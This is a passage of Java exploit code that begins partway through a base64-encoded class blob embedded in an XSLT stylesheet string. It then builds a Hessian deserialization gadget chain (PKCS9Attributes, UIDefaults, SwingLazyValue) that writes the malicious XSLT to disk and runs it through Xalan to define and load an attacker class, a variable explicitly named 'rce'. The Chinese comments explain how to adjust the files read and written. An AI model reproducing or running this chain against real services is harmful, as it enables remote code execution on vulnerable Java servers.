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')\"/>\n" +
            "      <xsl:variable name=\"cl\" select=\"th:getContextClassLoader(th:currentThread())\"/>\n" +
            "      <xsl:variable name=\"rce\" select=\"ru:defineClass('org.apache.commons.aq.SerializationUtil',$bs,$cl)\"/>\n" +
            "      <xsl:value-of select=\"$rce\"/>\n" +
            "    </xsl:template>\n" +
            "  </xsl:stylesheet>";
    private byte[] hessianPayload(String type) throws Exception {
        PKCS9Attributes pkcs9Attributes = SerializeUtils.createWithoutConstructor(PKCS9Attributes.class);
        UIDefaults uiDefaults = new UIDefaults();
        //PKCS9Attribute.EMAIL_ADDRESS_OID 是固定的，调试流程可以看到逻辑
        //去修改需要读取的文件，和写入的文件名，实例中是读取1.txt写入pwned.txt
        if (type == "writeXslt"){
            uiDefaults.put(PKCS9Attribute.EMAIL_ADDRESS_OID, new SwingLazyValue("com.sun.org.apache.xml.internal.security.utils.JavaUtils", "writeBytesToFilename", new Object[]{"1.xslt", xsltTemplate.getBytes()}));
        } else if (type == "loadXslt"){
            uiDefaults.put(PKCS9Attribute.EMAIL_ADDRESS_OID, new SwingLazyValue("com.sun.org.apache.xalan.internal.xslt.Process", "_main", new Object[]{new String[]{"-XT", "-XSL", "1.xslt"}}));
        }

        SerializeUtils.setFieldValue(pkcs9Attributes,"attributes",uiDefaults);
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        Hessian2Output out = new Hessian2Output(byteArrayOutputStream);
        // 写入魔术数字（Hessian 协议的开始标记）
        byteArrayOutputStream.write(67);
        // 设置 Hessian2Output 允许非序列化对象
        out.getSerializerFactory().setAllowNonSerializable(true);
        // 写入对象
        out.writeObject(pkcs9Attributes);
        // 关闭 Hessian2Output
        out.close();
        // 获取最终的字节数组
        return byteArrayOutputStream.toByteArray();
    }
}
